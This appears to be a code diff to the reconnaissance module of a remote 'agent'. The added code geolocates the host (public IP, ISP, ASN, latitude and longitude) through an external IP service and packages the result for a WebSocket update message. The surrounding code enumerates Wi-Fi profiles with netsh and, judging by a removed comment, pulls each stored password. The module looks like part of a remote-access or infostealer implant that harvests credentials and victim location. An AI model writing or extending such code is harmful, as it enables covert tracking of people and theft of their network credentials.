@@ -6,12 +6,36 @@ namespace LibraNextgen.Agent.Modules.Recon;
 
 public static class NetworkInfo
 {
+    private static string? _cachedGeoJson;
+    private static readonly object _geoLock = new();
+
+    /// <summary>
+    /// Fetch geo info once and cache in memory. Call at agent startup.
+    /// Returns the geo JSON for the agent.geo.update WS message.
+    /// </summary>
+    public static async Task<string?> WarmupGeoAsync()
+    {
+        if (_cachedGeoJson != null) return _cachedGeoJson;
+
+        try
+        {
+            using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(5) };
+            var resp = await client.GetStringAsync("https://uapis.cn/api/v1/network/myip");
+            lock (_geoLock)
+            {
+                _cachedGeoJson = resp;
+            }
+            return resp;
+        }
+        catch { return null; }
+    }
+
     public static async Task<string> CollectAsync()
     {
         // LAN interfaces
         var interfaces = CollectInterfaces();
 
-        // WAN
+        // WAN (uses cached geo if available)
         var wan = await CollectWanAsync();
 
         // WiFi (Windows only)
@@ -62,17 +86,7 @@ public static class NetworkInfo
 
     private static async Task<string> CollectWanAsync()
     {
-        string? publicIp = null;
         string? gateway = null;
-
-        // Public IP via external service
-        try
-        {
-            using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(3) };
-            var resp = await client.GetStringAsync("http://api.ipify.org");
-            publicIp = resp.Trim();
-        }
-        catch { /* ignore */ }
 
         // Default gateway
         try
@@ -94,9 +108,42 @@ public static class NetworkInfo
         }
         catch { /* ignore */ }
 
+        // Use cached geo data if available
+        string cached;
+        lock (_geoLock) { cached = _cachedGeoJson ?? ""; }
+
+        if (!string.IsNullOrEmpty(cached))
+        {
+            // Parse cached geo JSON and merge with gateway
+            try
+            {
+                var parts = new List<string>();
+                var ip = ExtractJsonString(cached, "ip");
+                var region = ExtractJsonString(cached, "region")?.Trim();
+                var isp = ExtractJsonString(cached, "isp");
+                var asn = ExtractJsonString(cached, "asn");
+                var llc = ExtractJsonString(cached, "llc");
+                var lat = ExtractJsonNumber(cached, "latitude");
+                var lng = ExtractJsonNumber(cached, "longitude");
+
+                parts.Add($"\"publicIp\":\"{Escape(ip ?? "unavailable")}\"");
+                parts.Add($"\"gateway\":\"{Escape(gateway ?? "unknown")}\"");
+                parts.Add($"\"region\":\"{Escape(region ?? "")}\"");
+                parts.Add($"\"isp\":\"{Escape(isp ?? "")}\"");
+                parts.Add($"\"asn\":\"{Escape(asn ?? "")}\"");
+                parts.Add($"\"llc\":\"{Escape(llc ?? "")}\"");
+                parts.Add($"\"latitude\":{lat}");
+                parts.Add($"\"longitude\":{lng}");
+
+                return $"{{{string.Join(",", parts)}}}";
+            }
+            catch { /* fall through */ }
+        }
+
         return $$"""
-            {"publicIp":"{{Escape(publicIp ?? "unavailable")}}",
-            "gateway":"{{Escape(gateway ?? "unknown")}}"}
+            {"publicIp":"{{Escape("unavailable")}}",
+            "gateway":"{{Escape(gateway ?? "unknown")}}",
+            "region":"","isp":"","asn":"","llc":"","latitude":0,"longitude":0}
             """;
     }
 
@@ -108,7 +155,6 @@ public static class NetworkInfo
 
         try
         {
-            // Get list of profiles
             var psi = new ProcessStartInfo
             {
                 FileName = "netsh",
@@ -123,7 +169,6 @@ public static class NetworkInfo
             proc.WaitForExit(5000);
             var output = proc.StandardOutput.ReadToEnd();
 
-            // Parse profile names
             var profileNames = new List<string>();
             foreach (var line in output.Split('\n'))
             {
@@ -142,7 +187,6 @@ public static class NetworkInfo
                 }
             }
 
-            // Get password for each profile
             foreach (var name in profileNames)
             {
                 try
@@ -265,6 +309,36 @@ public static class NetworkInfo
             "port":0,
             "bypass":"{{Escape(noProxy)}}"}
             """;
+    }
+
+    // ── Helpers ─────────────────────────────────────────────────────────────
+
+    private static string ExtractJsonString(string json, string key)
+    {
+        var search = $"\"{key}\":\"";
+        var start = json.IndexOf(search, StringComparison.Ordinal);
+        if (start < 0)
+        {
+            // Try with space after colon
+            search = $"\"{key}\": \"";
+            start = json.IndexOf(search, StringComparison.Ordinal);
+        }
+        if (start < 0) return "";
+        start += search.Length;
+        var end = json.IndexOf('"', start);
+        return end > start ? json[start..end] : "";
+    }
+
+    private static string ExtractJsonNumber(string json, string key)
+    {
+        var search = $"\"{key}\":";
+        var start = json.IndexOf(search, StringComparison.Ordinal);
+        if (start < 0) return "0";
+        start += search.Length;
+        while (start < json.Length && (json[start] == ' ' || json[start] == '"')) start++;
+        var end = start;
+        while (end < json.Length && (char.IsDigit(json[end]) || json[end] == '.' || json[end] == '-')) end++;
+        return end > start ? json[start..end] : "0";
     }
 
     private static string Escape(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");
